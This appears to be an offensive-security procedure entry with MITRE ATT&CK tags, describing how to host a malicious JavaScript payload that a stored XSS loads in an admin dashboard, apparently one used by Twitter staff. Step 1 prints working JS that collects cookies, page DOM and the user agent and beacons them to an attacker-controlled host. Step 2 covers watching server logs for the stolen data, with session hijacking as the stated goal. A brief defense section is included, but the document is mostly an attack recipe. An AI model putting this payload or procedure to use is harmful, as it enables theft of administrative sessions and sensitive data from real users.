---
tags:
  - exfiltration
  - data-theft
  - javascript
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Archive Collected Data]]'
updated_at: '2025-12-13T23:52:49.979Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 92f87f2c-1a8b-4863-94dc-464848adcf2e
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Archive Collected Data]]'
---
# Monitor-and-Exfiltrate-Sensitive-Data

## Summary

This procedure involves hosting and monitoring a malicious JavaScript payload on an attacker-controlled domain to capture exfiltrated data from the executed XSS in the admin dashboard, including DOM content, cookies, user IP, and browser details from Twitter staff.

## Description

Once triggered, the payload loads JS from attacker.com/js, which runs in the admin browser to collect sensitive information (e.g., via document.cookie, document.body.innerHTML, and fetch user IP via headers). Data is sent back to the attacker's server. This enables theft of administrative session data. Prerequisites: Hosted JS script that logs requests and extracts/sends data.

## Requirements

1. Server to host the JS file and log incoming requests (e.g., simple HTTP server)
2. JavaScript code to extract and exfiltrate data (e.g., via POST or beacon)
3. Monitoring tools for server logs

## Defense

Defensive measures and detection strategies:

- Implement strict CSP to prevent external script execution
- Monitor network traffic for unexpected outbound requests to unknown domains from admin browsers
- Encrypt and secure cookies with HttpOnly and Secure flags to limit XSS impact

## Objectives

1. Detect payload execution via server hits
2. Collect and store exfiltrated sensitive data
3. Analyze stolen information for further attacks (e.g., session hijacking)

## Instructions

### Step 1: Host the Malicious Script

**Context**: Set up a server to serve the JS file that extracts data upon load.

Example JS content (host as attacker.com/js):
```javascript
// Extract data
var data = {
  dom: document.body.innerHTML,
  cookies: document.cookie,
  ip: '', // Fetch via img src or XHR
  userAgent: navigator.userAgent
};
// Exfil via beacon or XHR
navigator.sendBeacon('https://attacker.com/log', JSON.stringify(data));
```

No command; use a web server like Python's http.server.

> Expected: Script available at the URL.

### Step 2: Monitor Server Logs

**Context**: Watch for requests indicating execution and data receipt.

No command; tail logs on your server.

> Expected: Two hits - one for script download, one for data POST/beacon with sensitive info like cookies and IP.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Archive Collected Data]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Exfiltration]]
- [[data-theft]]
- [[JavaScript]]
